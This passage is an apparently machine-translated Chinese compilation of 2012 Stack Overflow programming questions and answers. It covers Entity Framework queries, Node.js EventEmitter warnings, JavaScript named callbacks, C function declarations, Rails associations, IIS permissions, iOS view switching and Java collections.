                          [Extent1].[MessageUniqueId] AS [MessageUniqueId],
                          [Extent1].[FromAddressBookEntryId] AS [FromAddressBookEntryId],
                          [Extent1].[ToEmailAddress] AS [ToEmailAddress],
                          [Extent1].[EmailFolderId] AS [EmailFolderId],
                          [Extent1].[EmailHeaderInfo] AS [EmailHeaderInfo],
                          [Extent1].[EmailSendSmtpServer] AS [EmailSendSmtpServer],
                          [Extent1].[EmailSendStatus] AS [EmailSendStatus],
                          [Extent1].[EmailSendStartTime] AS [EmailSendStartTime],
                          [Extent1].[EmailSendFinishTime] AS [EmailSendFinishTime],
                          [Extent1].[EmailSendLogMessage] AS [EmailSendLogMessage],
                          [Extent1].[Subject] AS [Subject],
                          [Extent1].[MimeMessageFull] AS [MimeMessageFull],
                          [Extent1].[HighPriority] AS [HighPriority],
                          [Extent1].[SentDateTime] AS [SentDateTime],
                          [Extent1].[EmailDeleted] AS [EmailDeleted],
                          [Extent1].[EmailDeletedDateTime] AS [EmailDeletedDateTime],
                          [Extent1].[EmailViewed] AS [EmailViewed],
                          [Extent1].[EmailViewedDateTime] AS [EmailViewedDateTime],
                          [Extent1].[BodyTextForSend] AS [BodyTextForSend],
                          [Extent1].[ReceivedDate] AS [ReceivedDate]
                   FROM [dbo].[EmailDetails] AS [Extent1]
                        INNER JOIN [dbo].[Users] AS [Extent2] ON [Extent1].[UserId] =
                        [Extent2].[Id]
                        INNER JOIN [dbo].[AddressBookEntries] AS [Extent3] ON
                        [Extent1].[FromAddressBookEntryId] = [Extent3].[Id]
                   WHERE ([Extent2].[Username] = @p__linq__0) AND
                         ([Extent3].[WhiteList] = 1))  AS [Project1]
            ORDER BY [Project1].[EmailSendFinishTime] DESC',N'@p__linq__0 nvarchar(4000)
            ',@p__linq__0=N'ekellner9 
```

EmailDetail 定义和 AddressBookEntry 定义

```
 public class EmailDetail
        {
            public EmailDetail()
            {
                // keep sqlserver from blowing up with no datetime set
                EmailSendStartTime = new DateTime(1900, 1, 1);
                EmailSendFinishTime = new DateTime(1900, 1, 1);
            }
            [Key]
            [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
            public long Id { get; set; }

            [ForeignKey("User")]
            public long UserId { get; set; }

            [Required(ErrorMessage = "Must have user associted with EmailDetail")]
            public User User { get; set; }

            public long? FromAddressBookEntryId { get; set; }
            public AddressBookEntry FromAddressBookEntry { get; set; }

            public DateTime EmailSendStartTime { get; set; }
            public DateTime EmailSendFinishTime { get; set; }  
        }
        public class AddressBookEntry
        {
            [Key]
            [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
            public long Id { get; set; }

            [ForeignKey("User")]
            public long UserId { get; set; }

            [Required]
            public User User { get; set; }

            [MaxLength(512)]
            [Required(ErrorMessage = "Email is required")]
            public string Email { get; set; }
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:46:14.787

我没有得到和你一样的结果。使用以下控制台应用程序：

```
 public class EmailDetail
    {
        public EmailDetail()
        {
            // keep sqlserver from blowing up with no datetime set
            EmailSendStartTime = new DateTime(1900, 1, 1);
            EmailSendFinishTime = new DateTime(1900, 1, 1);
        }
        [Key]
        [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public long Id { get; set; }
        [ForeignKey("User")]
        public long UserId { get; set; }
        [Required(ErrorMessage = "Must have user associted with EmailDetail")]
        public User User { get; set; }
        public long? FromAddressBookEntryId { get; set; }
        public AddressBookEntry FromAddressBookEntry { get; set; }
        public DateTime EmailSendStartTime { get; set; }
        public DateTime EmailSendFinishTime { get; set; }
    }

    public class AddressBookEntry
    {
        [Key]
        [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public long Id { get; set; }
        [ForeignKey("User")]
        public long UserId { get; set; }
        [Required]
        public User User { get; set; }
        [MaxLength(512)]
        [Required(ErrorMessage = "Email is required")]
        public string Email { get; set; }
        public bool WhiteList { get; set; }
    }

    public class User
    {
        public long UserId { get; set; }
        public string Username { get; set; }
    }

    public class CFContext : DbContext
    {
        public DbSet<AddressBookEntry> AddressBookEntries { get; set; }
        public DbSet<User> Users { get; set; }
        public DbSet<EmailDetail> EmailDetails { get; set; }

        protected override void OnModelCreating(DbModelBuilder modelBuilder)
        {
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            var db = new CFContext();

            var y = (from data1 in db.EmailDetails
                     join data2 in db.AddressBookEntries on data1.FromAddressBookEntryId equals data2.Id
                     orderby data1.EmailSendFinishTime descending
                     select data1.EmailSendFinishTime).FirstOrDefault();

            string username = "1";

            var x = db.EmailDetails.Where(a => a.User.Username == username && a.FromAddressBookEntry.WhiteList).
                                        Select(a => new
                                        {
                                            a.EmailSendFinishTime
                                        }).
                                        OrderByDescending(
                                            a => a.EmailSendFinishTime)
                                        .FirstOrDefault();

            Console.WriteLine(y);
            Console.WriteLine(x);
        }
    } 
```

我得到了这些 SQL 查询

```
SELECT TOP (1) 
[Extent1].[EmailSendFinishTime] AS [EmailSendFinishTime]
FROM [dbo].[EmailDetails] AS [Extent1]
WHERE [Extent1].[FromAddressBookEntryId] IS NOT NULL
ORDER BY [Extent1].[EmailSendFinishTime] DESC

SELECT TOP (1) 
[Project1].[C1] AS [C1], 
[Project1].[EmailSendFinishTime] AS [EmailSendFinishTime]
FROM ( SELECT 
    [Extent1].[EmailSendFinishTime] AS [EmailSendFinishTime], 
    1 AS [C1]
    FROM   [dbo].[EmailDetails] AS [Extent1]
    INNER JOIN [dbo].[Users] AS [Extent2] ON [Extent1].[UserId] = [Extent2].[UserId]
    INNER JOIN [dbo].[AddressBookEntries] AS [Extent3] ON [Extent1].[FromAddressBookEntryId] = [Extent3].[Id]
    WHERE ([Extent2].[Username] = @p__linq__0) AND ([Extent3].[WhiteList] = 1)
)  AS [Project1]
ORDER BY [Project1].[EmailSendFinishTime] DESC 
```

您的模型中是否还有其他内容，或者上面的 SQL 查询中是否还有其他内容？

# javascript - Node.js“检测到 EventEmitter 内存泄漏”

> ID：12146697
> 
> 赞同：2
> 
> 时间：2012-08-27T17:33:41.557
> 
> 标签：javascript, node.js

我的基本 Node.js 应用程序看起来像这样（基本上我经常调用一个 Web 服务，并将该数据推送到客户端）大约一天后，即使添加了emitter.setMaxListeners（ 0)。我很确定我的代码没有任何内存泄漏。有什么建议吗？

```
/*
* Server setup
*/
var querystring = require('querystring');
var xml2js = require('xml2js');
var parser = new xml2js.Parser();
var eyes = require('eyes');
var http = require('http');
var app = http.createServer(handler);
var io  = require('socket.io').listen(app);
var emitter = new (require('events').EventEmitter);
emitter.setMaxListeners(0);
io.set('log level', 0);

app.listen(8080);

function handler(req, res){
    res.writeHead(200, {'Content-Type':'text/html'});
    res.end('Test');
}

/*
* Global data object
*/
var xmlData= '';
var cache = [];

/*
* web service info
*/
var postData = querystring.stringify({  
    'index' : '',
    'type' : '-1',
}); 

var options = {
    host: 'localhost',
    path: '/WebService.asmx',
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',  
        'Content-Length': postData.length 
    }
};

var getData = function(){

    // Web Service Request Obj
    var webServiceReq = http.request(options, function(res) {  

      res.setEncoding('utf8');  

      res.on('data', function (chunk) {  
        xmlData += chunk;
      }).on('end', function() {

        parser.parseString(xmlData, function(err, data){
                cache = JSON.parse(data['#']);
        });

        io.sockets.emit('message', { "data": cache});

      });// end res.on('end')

    });  

    webServiceReq.write(postData);
    webServiceReq.end();
}

// grab the info every 10 seconds
setInterval(getData, 5000);

// emit the latest data when client initially connects
io.sockets.on('connection', function (socket) {
    // emit the data
    socket.emit('message', {"data": cache});
}); 
```

错误：

```
(node) warning: possible EventEmitter memory leak detected. 11 listeners added. Use emitter.setMaxListeners() to increase limit.
Trace
    at Parser.EventEmitter.addListener (events.js:168:15)
    at Parser.exports.Parser.Parser.parseString (C:\WebApplications\WebApp\scripts\node_modules\xml2js\lib\xml2js.js:197:14)
    at Parser.__bind [as parseString] (C:\WebApplications\WebApp\scripts\node_modules\xml2js\lib\xml2js.js:6:61)
    at IncomingMessage.getData (C:\WebApplications\WebApp\scripts\nodeService.js:87:20)
    at IncomingMessage.EventEmitter.emit (events.js:115:20)
    at IncomingMessage._emitEnd (http.js:366:10)
    at HTTPParser.parserOnMessageComplete [as onMessageComplete] (http.js:149:23)
    at Socket.socketOnData [as ondata] (http.js:1356:20)
    at TCP.onread (net.js:410:27) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-28T08:39:13.860

问题是

```
Use emitter.setMaxListeners() to increase limit. 
```

并不意味着“创建发射器对象并将emitter.setMaxListeners(0) 添加到您的代码中”。单词“发射器”在这里指的是从 EventEmitter 继承的任何对象，例如服务器、进程、请求等。在您的情况下，显示的代码中有 2 个发射器：app 和 io。你应该写的是：

```
var http = require('http');
var app = http.createServer(handler);
var io  = require('socket.io').listen(app);
app.setMaxListeners(0);
io.setMaxListeners(0);
io.set('log level', 0);

app.listen(8080); 
```

# c# - 如何将函数或属性分配给所有其他类，就像 ToolTip

> ID：12146708
> 
> 赞同：5
> 
> 时间：2012-08-27T17:34:24.350
> 
> 标签：c#, tooltip

当我在 C# 中的窗体上拖放一个`ToolTip`对象时，窗体上的每个控件都会获得一个名为`ToolTip`以前不存在的新属性。我正在尝试创建类似的东西，`ToolTip`这样当我将它拖放到我的表单上时，所有控件都会自动获得它的新属性。

如果有人能给我一个定义，我也将不胜感激，以便我可以编辑我的问题以更好地传达我的意图和意义。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-27T17:43:05.290

您正在寻找的是“[扩展器提供者](http://msdn.microsoft.com/en-us/library/ms171836)”。很简单，您实际上并没有将新属性添加到控件的网格中。相反，您实现了 VS 设计器寻找的接口，它告诉 VS 如何将网格中设置的属性“转换”为对 Extender Provider 的调用以真正做到这一点。

除了 ToolTips 之外，像 TableLayoutPanel 和 FlowLayoutPanel 这样的 LayoutPanel 也做类似的事情，以及某些其他“元窗口组件”。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-27T17:42:48.707

`ToolTip`是一个[扩展器提供者](http://msdn.microsoft.com/en-us/library/ms171836.aspx)。实现它的完整文档在[这里，](http://msdn.microsoft.com/en-us/library/d6c1xa43.aspx)[这里](http://msdn.microsoft.com/en-us/library/ms229066.aspx)有一个完整的例子。

ToolTip 可能会像这样实现：

```
[ProvideProperty("ToolTip", typeof(IComponent))]
class ToolTip : IExtenderProvider {...} 
```

# wpf - 如何正确管理 gui 的动态数据表

> ID：12146712
> 
> 赞同：1
> 
> 时间：2012-08-27T17:34:34.840
> 
> 标签：wpf, gridview, datatable, hierarchical-data, caliburn.micro

所以我需要在 WPF 中显示一个 DataGrid。我正在使用 Telerik 的 RadGridView 和 Caliburn.Micro 框架，使用 MVVM 策略。

在我的演示文稿中，有不同数量的列，确切地说是 X+2，因为总是有一个标签列和一个总计列，然后是 X 个其他包含十进制数的列。

在创建我需要的类之前，我确实知道运行时的数字，这样可以提供帮助。

所以我目前正在考虑一些这样做的方法，但其中一些有缺点，所以如果有人能指出我的解决方案，我会很高兴。

1.  为每一行和每个 Cell 创建一个 ViewModel 类。X 号将是一个集合，并且绑定到它是有问题的。我需要自定义 RadGridView itsefl 来实际管理它。

2.  创建一个 DataTable 并运行并绑定到它。我还没有设法完成这项工作，并且不确定 RadGridView 是否真的支持 DataTable。这也不允许我为每个单元格保留元数据，我需要能够轻松地更新单元格，因为列+行不是我需要的唯一区别键。

3.  以某种方式动态创建一个具有 x+2 属性的对象来绑定。

有什么解决方案、指南或其他东西可以帮助我吗？

# javascript - 使用命名函数进行回调

> ID：12146717
> 
> 赞同：7
> 
> 时间：2012-08-27T17:34:57.077
> 
> 标签：javascript

我在使用匿名函数在 javascript 中进行分析时遇到了一个主要问题，我总是有很多匿名函数 - 其中大多数是回调 - 这使得分析分析器的结果对我来说非常困难。

最后我决定使用命名函数进行回调，如下所示：

```
var f = function(callback) {
    // Do something ...
    callback();
}

f(function named_function() {
    console.log('Sample callback function!');
}); 
```

我想知道在我的代码中进行此更改后我会遇到任何问题吗？这种类型的函数定义和传递会在任何地方保留名称（named_function）吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-27T17:40:24.803

该名称仅在命名函数表达式的范围内可用。

但在 IE 8 及更低版本中存在问题。它会泄漏到外部范围，并且实际上会创建一个不同的函数对象，所以如果这是一个问题，你应该取消它。

```
f(function named_function() {
    console.log('Sample callback function!');
});
var named_function = null; 
```

有关更多信息，请参阅本文：[命名函数表达式揭秘](http://kangax.github.com/nfe/)

或者您可以像这样创建它来解决 IE 问题。

```
f(function() {
    return function named_function() {
        console.log('Sample callback function!');
    };
}()); 
```

但这有点难看。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:39:52.843

如果您传递这样的匿名函数，则该名称将存在于函数本身中。

它不会存在于任何其他范围内。

```
var f = function(callback) {
    // Do something ...
    callback();
}

f(function named_function() {
    console.log(named_function); // Logs the function
    console.log('Sample callback function!');
});

console.log(named_function);​ // Error: named_function is undefined 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:41:35.710

你不必把事情复杂化。

声明时只需命名函数

```
var foo = function foo(){}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:40:01.223

在范围内定义命名回调将导致它仅在该范围内可见。因此，我会得出结论，不应该有任何命名冲突。例如，以下代码按预期运行：

```
(function named_callback() { console.log("Callback 1"); })();
(function named_callback() { console.log("Callback 2"); })();​ 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-27T17:40:34.433

实际上，您仍在创建*匿名*函数表达式并将其分配给局部范围变量`f`。去做

```
function f( callback ) {
    callback();
}

f( named_function );

function named_function() {
    console.log('Sample callback function!');
} 
```

这样，您甚至可以避免 <= IE8 中的*命名函数表达式*内存泄漏，此外，由于您不再创建*函数表达式*而是创建 *function 声明，因此您甚至可以`f`在主体内访问。

# c - C 中的函数原型

> ID：12146718
> 
> 赞同：2
> 
> 时间：2012-08-27T17:35:00.773
> 
> 标签：c, header

今天早些时候，我浏览了各种头文件，只是为了将它们与我正在制作的头文件进行比较，并注意到它们似乎声明它们的函数有点不同。

例如这里是`strlen`from的声明`string.h`：

`extern size_t __cdecl strlen(const char *);`

在做了一些研究后，我发现这`extern`是为了在功能块之外声明一个变量。在头文件中声明我的函数也是最佳做法`extern`吗？

我看到他们使用`size_t`which is `unsigned long long`here 而不是`int`，我假设这是因为它更有效有几个原因（例如字符串的长度永远不会是负数），但这是他们`size_t`在这里使用的原因吗？还是我完全错过了重点？

然后最后我看到`__cdecl`我找不到太多信息。究竟是`__cdecl`什么？我也应该使用它吗？

最后，我注意到在这个声明中没有变量名用于传递给`strlen`. 我猜这是因为这不是一个函数原型，只是一个声明，而原型在别处。为什么声明中没有变量名`strlen(const char *str)`？

我的最后一个问题是，如果这只是一个声明，strlen 的函数原型会是什么样子？我的猜测是这样的：

`size_t strlen(const char *str)`

我只是问，因为我想学习和改进我的代码（假设我在 C 文件中制作函数原型/声明，然后只是在头文件中声明函数，以便其他 C 文件可以使用它们）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-27T17:40:26.763

1.  `size_t`是更合适的返回值`strlen`而不是`int`
2.  `__cdecl`是函数的调用约定。这表示谁为参数、返回值等设置堆栈以及谁清除它。更多参考：[调用约定](http://en.wikipedia.org/wiki/Calling_convention)
3.  在声明函数时，您实际上并不需要参数名称。只需参数类型就足够了。

更新`extern`：

*   `extern`告诉编译器该语句只是一个声明而不是定义。因此，对于函数原型，`extern`不会添加任何价值，因为它已经只是一个定义。参考：[C 外部](http://en.wikipedia.org/wiki/External_variable)

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:54:46.750

声明函数时关键字是多余的`extern`，因为很明显它必须在其他地方定义。对于没有`extern`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:56:59.000

`size_t` *是*定义`strlen`返回的内容。在您的情况下，它似乎也像一个 64 位系统，理论上一个字符串可以大于可以存储在`int`.

`__cdecl`是编译标准库时使用的调用对流。如果您应该为程序选择不同的调用约定（使用一些编译器选项），预编译的库函数仍将使用正确的约定。

我经常在函数声明中命名所有参数，因为它有助于记录它们是什么。只是`int f(int, int, int, int)`对我帮助不大，但对编译器来说已经足够了。因此名称是可选的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:58:12.277

正如@Rohan 所说，关于 size_t ，它是一种用于保存大小的类型。例如，它不能是负面的。这主要是因为一些安全问题。（例如`getpeername`，FreeBSD 中使用 int 而不是 size_t 导致的安全漏洞）
关于 cdecl 这可能会对您有所帮助（它来自[PC 汇编手册](http://www.drpaulcarter.com/)）：

> Borland 和 Microsoft 使用通用语法来声明[调用约定](http://en.wikipedia.org/wiki/Calling_convention)。他们将 cdecl 和 stdcall 关键字添加到 C 中。这些关键字充当函数修饰符，并立即出现在原型中的函数名称之前。例如，对于 Borland 和 Microsoft，函数 f 将定义如下：
> 
> 无效 __cdecl f ( int );
> 
> 每个调用约定都有优点和缺点。cdecl 约定的主要优点是简单且非常灵活。它可以用于任何类型的 C 函数和 C 编译器。使用其他约定可能会限制子例程的可移植性。它的主要缺点是它可能比其他一些慢并且使用更多内存（因为函数的每次调用都需要代码来删除堆栈上的参数）。
> 
> stdcall 约定的优点是它使用的内存比 cdecl 少。在 CALL 指令之后不需要进行堆栈清理。它的主要缺点是它不能与具有可变数量参数的函数一起使用。[喜欢`printf`]

# ruby-on-rails - 将控制器中的模型用于不同的模型？

> ID：12146720
> 
> 赞同：1
> 
> 时间：2012-08-27T17:35:03.527
> 
> 标签：ruby-on-rails, model, controller

我在 Rails 项目中有一个用户模型（由设计生成）和一个提交模型。我在用户模型中添加了一个名为“full_name”的字段。此外，提交模型中有一个“user_id”字段。

我想在提交显示页面上显示与提交相关联的用户的全名。现在它显示来自提交模型的 user_id 就好了。

我有这个用户模型：

```
class User < ActiveRecord::Base
  has_many :submissions
  devise :database_authenticatable, :registerable,
     :recoverable, :rememberable, :trackable, :validatable, :confirmable

  attr_accessible :email, :password, :password_confirmation, :remember_me, :full_name, :role_id

  validates_presence_of :full_name
end 
```

这是提交的模型：

```
class Submission < ActiveRecord::Base
  belongs_to :user
  attr_accessible :description, :title, :user_id
end 
```

这是在控制器中：

```
 def show
    @submission = Submission.find(params[:id])
    @user = User.find(params[@submission.user_id])

    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @submission }
    end
  end 
```

当我尝试在视图中使用这条线时，我得到了什么：

```
<%= @user.full_name %> 
```

我收到此错误：

```
Couldn't find User without an ID 
```

我尝试了几种变体，但无法完全弄清楚应该用什么代替：

```
@user = User.find(params[@submission.user_id]) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:39:59.190

假设您正确地填充了数据，您只需在查找提交内容后执行以下操作。

`@submission.user`

如果您认为数据没问题，那么在 Rails 控制台中尝试以下操作。

`> Submission.first.user`

你在那里看到什么？

* * *

您看到的具体错误是因为：

`params[@submission.user_id]`

不太可能有任何东西。如果用户 ID 为“1”（例如），那么您将要求`params`哈希中与键“1”相对应的值。

# c# - 通过进程写入文件夹 - ASP.NET 和 Windows Server 2008 R2

> ID：12146721
> 
> 赞同：0
> 
> 时间：2012-08-27T17:35:04.270
> 
> 标签：c#, asp.net, windows, permissions, windows-server

我通过 wkhtmltopdf（使用 C# 中的 Process）从 HTML 页面生成 PDF 文件。

在本地系统（Windows 7）上它可以工作，但在 Windows Server 2008 R2 上我有“System.IO.FileNotFoundException”。Process (C#) 执行的 wkhtmltopdf 没有足够的权限来写入文件。

我测试了很多文件夹（例如：“APPDIR/Content/temp”），但我不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:43:58.217

您的应用程序运行的进程必须具有足够的权限才能写入文件夹。

您（很可能通过 ASP.NET 标记判断）网站可以配置为在 IIS 管理控制台中以您想要的任何用户身份运行。

默认情况下，应用程序池作为 ApplicationPoolIdentity 运行并授予访问权限，您将使用：`IIS AppPool\ApplicationPoolName`account。

您还可以将应用程序池更改为作为另一个帐户运行，并为该帐户配置文件夹权限。

您必须在框中键入完整的帐户名称，因为搜索是 Active Directory 功能，对于本地帐户不能按预期工作（在“选择用户或组”对话框中）

![在此处输入图像描述](../Images/0fe70cf78b14213c8e046a6eb1501143.png)

# iphone - 如何创建一个 UIViewController 具有两个视图，根据单击的按钮显示一个或另一个

> ID：12146722
> 
> 赞同：7
> 
> 时间：2012-08-27T17:35:04.850
> 
> 标签：iphone, objective-c

我对 iOS 开发很陌生，我被困住了。目前我正在使用一个选项卡控制器在两个视图控制器（列表和地图视图）之间切换。这使得使用故事板配置两个视图的外观变得更加容易。

现在需求发生了变化，应用程序需要一个视图控制器，该控制器带有一个分段控件，单击时可以显示列表或地图视图。为此，我需要制作一个可以显示列表/地图视图的视图控制器。

我了解分段控制器部分的工作原理，但我只是坚持如何让两个视图显示在同一区域中。我怎样才能在一个视图控制器中拥有两个视图（如果可能，使用情节提要）？

提前致谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-27T17:43:53.447

您不应该在单个视图控制器中有两个主视图，而是需要为每个要显示的视图创建一个视图控制器。但是，您当然可以在单个视图控制器中拥有多个子视图，这可能对您有用。

有很多方法可以解决这个问题，正确的方法是创建一个容器 UIViewController，并将您要显示的 2 个视图控制器添加为其子项，它们只需将视图设置为您要显示的视图控制器，但这可能会过于复杂，因为您提到您是 iOS 开发的新手。

因此，一个简单的解决方案（不确定您是否可以在情节提要中实现这一点 - 因为我不喜欢它），将有一个带有选项卡的单个视图控制器，以及主视图的 2 个子视图，然后您可以简单地切换通过执行以下操作在视图之间：

```
[self.view addSubview:view1]; 
```

//换成

```
[view1 removeFromSuperview];
[self.view addSubView:view2]; 
```

或者，您实际上并不需要将其从超级视图中删除，只需将其隐藏，然后用于`bringSubViewToFront`显示您需要的视图。

如果您想使用其他方法，我建议您观看此视频，即 WWDC 2011 视频，标题为“实现 UIViewController Containment”。这个其他问题应该对：[UISegmented control with 2 views有用](https://stackoverflow.com/questions/9110567/switching-viewcontrollers-with-uisegmentedcontrol-in-ios5)

希望有帮助。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-27T17:51:13.840

使用情节提要 api，您可以在 2 个视图控制器之间切换

```
 - (void)viewDidLoad {
    [super viewDidLoad];
    UIViewController *viewController = [self viewControllerForSegmentIndex:self.typeSegmentedControl.selectedSegmentIndex];
    [self addChildViewController:viewController];
    viewController.view.frame = self.contentView.bounds;
    [self.contentView addSubview:viewController.view];
    self.currentViewController = viewController;
}
- (UIViewController *)viewControllerForSegmentIndex:(NSInteger)index {
    UIViewController *viewController;
    switch (index) {
        case 0:
            viewController = [self.storyboard instantiateViewControllerWithIdentifier:@"FirstViewController"];
            break;
        case 1:
            viewController = [self.storyboard instantiateViewControllerWithIdentifier:@"SecondViewController"];
            break;
    }
    return viewController;
}
- (IBAction)segmentChanged:(UISegmentedControl *)sender {
    UIViewController *viewController = [self viewControllerForSegmentIndex:sender.selectedSegmentIndex];
    [self addChildViewController:viewController];
    [self transitionFromViewController:self.currentViewController toViewController:viewController duration:0.0 options:UIViewAnimationOptionTransitionNone animations:^{
        [self.currentViewController.view removeFromSuperview];
        viewController.view.frame = self.contentView.bounds;
        [self.contentView addSubview:viewController.view];
    } completion:^(BOOL finished) {
        [viewController didMoveToParentViewController:self];
        [self.currentViewController removeFromParentViewController];
        self.currentViewController = viewController ;
    }];
    self.navigationItem.title = viewController.title;
} 
```

这是参考 Raywenderlich 的[iOS 教程](http://www.raywenderlich.com/store/ios-5-by-tutorials)。希望这可以帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-16T08:22:00.330

使用 Storyboard 可以通过这种方式实现。

1.  创建 UIViewController 并添加 UISegmentControl 和 UITableView+UITableViewCell。

[![带有段控制的故事板表格视图](../Images/2d4696aae3432d888cb2b74aefc6123f.png)](https://i.stack.imgur.com/YwxH5.png)

2.  现在您还想添加 MKMapView，悬停器，如果您只是尝试将 MapView 放在 ViewController 上，它将被添加为新的 TableView 单元格，这不是我们想要的。

[![故事板地图视图添加为 tableviewcell](../Images/d9f523b3d57ba497af8d406138aafb78.png)](https://i.stack.imgur.com/5yBdf.png)

这就是为什么你不应该这样做。相反，必须将 MapView 添加到 Storyboard 的 ViewControllers 列表中

[![MapView 添加到 Stroyboard viewcontroller 视图](../Images/edf437978b09a1539b37740f990fcd9a.png)](https://i.stack.imgur.com/MzfT6.png)

3.  将 MapView 的大小和原点调整为与 TableView 相同。

[![调整 MapView 的大小和原点](../Images/6dfd51fb476a52385fbd506ae596f33c.png)](https://i.stack.imgur.com/IPUn2.png)

3.  现在，为 MapView 的 TableView 设置隐藏为 YES，为它们创建和合成 outlet。然后在Segment control Value Changed方法中实现切换：

    ```
    - (IBAction)switchView:(id)sender {
        self.theTableView.hidden = !self.theTableView.hidden;
        self.theMapView.hidden = !self.theMapView.hidden;

        if (!self.theTableView.hidden) {
            [self.theTableView reloadData];
        }
    } 
    ```

# c# - 返回 System.String[] 而不是数组

> ID：12146723
> 
> 赞同：5
> 
> 时间：2012-08-27T17:35:07.117
> 
> 标签：c#

我试图返回一个字符串数组，但`return test;`只给出“System.String[]”作为输出。如果我遍历 test[] 所有值都正确填写。我究竟做错了什么？

```
 public static String[] ReturnTheStrings()
 {
     FillTheArray();
     String[] test = new String[178];

     for (int i = 0; i < 178; i++)
     {
         if ((Class7.Method4(strings[i])) == "decoding wrong")
         {
             test[i] = strings[i+1];
             //System.Console.WriteLine("Non-encoded value");
         }
         else
         {
             test[i] = Class7.Method4(strings[i+1]);
             //System.Console.WriteLine("Encoded value");
         }
     }
     return test;
 } 
```

我正在使用 MS Visual C# 2010。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-27T17:36:31.963

调用`.ToString()`数组将返回“System.String[]”。如果要显示数组中的每个值，则需要对其进行迭代。

例如：

```
foreach (var value in test)
{
    Console.WriteLine(value);
} 
```

或者，正如@Oded 指出的那样，您可以使用[String.Join](http://msdn.microsoft.com/en-us/library/57a79xd0.aspx)。

```
Console.WriteLine(String.Join(Environment.NewLine, stringArray)); 
```

# blackberry - 应用程序未在黑莓中加载

> ID：12146724
> 
> 赞同：1
> 
> 时间：2012-08-27T17:35:08.720
> 
> 标签：blackberry

我的应用程序几乎完成了，我需要更改包名称。因此，我重构了名称，并在重命名了包含 MAIN 类的包后，将显示此警告-“**未找到导出的静态例程的定义：.main(String[])** ”。

在谷歌搜索中，我发现这是因为编译器没有找到应用程序的任何入口点，这就是为什么应用程序没有加载到模拟器/设备中的原因。

有人可以帮我吗？

提前致谢 ！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:55:29.520

正如错误消息所暗示的，您必须有一个带有签名的方法：

```
public static void main(String[] args) {
} 
```

在您的一个类中定义。无关紧要，但通常在扩展 Application 或 UiApplication 的类中定义它，因为此方法创建 Application 或 UiApplication 对象并进入事件调度程序。如果您曾经在模拟器或设备上运行过应用程序，那么您一定有过这样的方法。

# java - HashSet中HashMap的Java存储与查找

> ID：12146726
> 
> 赞同：1
> 
> 时间：2012-08-27T17:35:15.860
> 
> 标签：java, hashmap, hashset

我有一组带有多维哈希图的集合，如下所示：

```
Set<HashMap<String, HashMap<String, String>>> myHashSet = new HashSet<HashMap<String, HashMap<String, String>>>(); 
```

我在删除 HashMap 条目时遇到问题。我知道顶级哈希映射的键，但不知道底层哈希映射中的任何数据。我正在尝试通过以下方式删除集合中的哈希映射条目：

一世。

```
Set<HashMap<String, HashMap<String, String>>> myHashSet = new HashSet<HashMap<String, HashMap<String, String>>>();

... Add some hashmaps to the set, then ...

String myKey = "target_key";
setInQuestion.remove(myKey); 
```

二、

```
Set<HashMap<String, HashMap<String, String>>> myHashSet = new HashSet<HashMap<String, HashMap<String, String>>>();

... Add some hashmaps to the set, then ...

String myKey = "key_one"; //Assume a hashmap has been added with this top level key
HashMap<String, HashMap<String, String>> removeMap = new HashMap<String, HashMap<String, String>>();
HashMap<String, String> dummyMap = new HashMap<String, String>();
removeMap.put(myKey, dummyMap);
setInQuestion.remove(removeMap); 
```

这些方法都不起作用。如果我只知道顶级哈希图的键，我将如何删除集合中的条目？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:39:59.103

`Collection.remove()`要求对象相等。各种 jdk Map 实现实现相等意味着所有键/值必须匹配。由于您传递给`remove()`调用的所有对象都不会与 Set 中的任何映射“相等”，因此不会删除任何内容。

做您想做的事情的唯一方法是自己遍历 Set 以找到匹配的 Map （或者，将 Set 设置为以该特殊键为键的 Map ）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:50:42.050

感谢 jtahlborn 的指导。想发布我根据您的回答找到的解决方案：

```
String myKey = "Key_In_Question";
Iterator mySetIterator = myHashSet.iterator();
while(mySetIterator.hasNext()) {
    HashMap<String, HashMap<String, String>> entry = (HashMap<String, HashMap<String, String>>) mySetIterator.next();
    if(entry.containsKey(myKey)) {
        myHashSet.remove(entry);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:05:45.273

抱歉，我无法将此作为评论发布。我想指出@jtahlborn 关于`Map`平等的观点是合同中明确定义的部分......请参阅[`Map.equals`](http://docs.oracle.com/javase/7/docs/api/java/util/Map.html#equals%28java.lang.Object%29)。

> ... 两个映射`m1`并`m2`表示相同的映射 if `m1.entrySet().equals(m2.entrySet())`。这确保了 equals 方法在`Map`接口的不同实现中正常工作。

[`Map.Entry.equals`](http://docs.oracle.com/javase/7/docs/api/java/util/Map.Entry.html#equals%28java.lang.Object%29)措辞类似。

